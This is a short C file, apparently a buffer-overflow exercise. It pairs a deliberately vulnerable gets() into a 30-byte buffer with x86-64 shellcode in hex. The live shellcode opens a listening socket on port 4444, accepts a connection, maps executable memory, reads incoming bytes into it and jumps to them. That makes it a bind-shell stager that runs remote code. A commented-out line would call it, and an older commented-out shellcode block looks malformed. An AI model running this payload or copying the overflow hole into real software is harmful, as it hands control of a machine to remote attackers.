//char shellcode[] =
//"\x42\0"
//"\x65\0\x68\0\x6e\x61\0\x6d\x20\0"
//"\x52\0"
//"\x61\0"
//"\x73\0\x6f"
//"\x6f"
//"\x6c"
//"\x69\0\x61\0\x6e\x0a\x6d\x61\0\x68\0"
//"\x6d"
//"\x61\0"
//"\x68\0\x72\0\x61\0\x6d\x20\0"
//"\x52\0"
//"\x61\0"
//"\x73\0\x6f"
//"\x6f"
//"\x6c"
//"\x69\0\x61\0\x6e\x0a\xb8\x04\0\x00\0"
//"\xb8\x04\0\x00\0\x00\0\x00\0"
//"\xbb\x01\0\x00\0\x00\0\x00\0"
//"\xb9\x78\0\x00\0\x60\0\x00\0"
//"\xba\x11\0\x00\0\x00\0\x00\0"
//"\xcd\x80\0"
//"\xc7\x04\0\x25\0\x78\0\x00\0\x60\0\x00\0"
//"\x6d\x62\0\x00\0\x00\0"
//"\xb8\x04\0\x00\0\x00\0\x00\0"
//"\xbb\x01\0\x00\0\x00\0\x00\0"
//"\xb9\x78\0\x00\0\x60\0\x00\0"
//"\xba\x11\0\x00\0\x00\0\x00\0"
//"\xcd\x80\0"
//"\xb8\x01\0\x00\0\x00\0\x00\0"
//"\xbb\x00\0\x00\0\x00\0\x00\0"
//"\xcd\x80\0";
//
char shellcode[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x59\x6a\x32\x58\x0f\x05\x48\x96\x6a\x2b\x58\x0f"
"\x05\x50\x56\x5f\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31"
"\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x96\x48\x97\x5f\x0f"
"\x05\xff\xe6";
int function() {
    char array[30];
    gets(array);
    printf("%s\n", array);
}
int main() {
    function();
    //void (*fp) (void);
    //fp = (void*) shellcode;
    //fp();
}
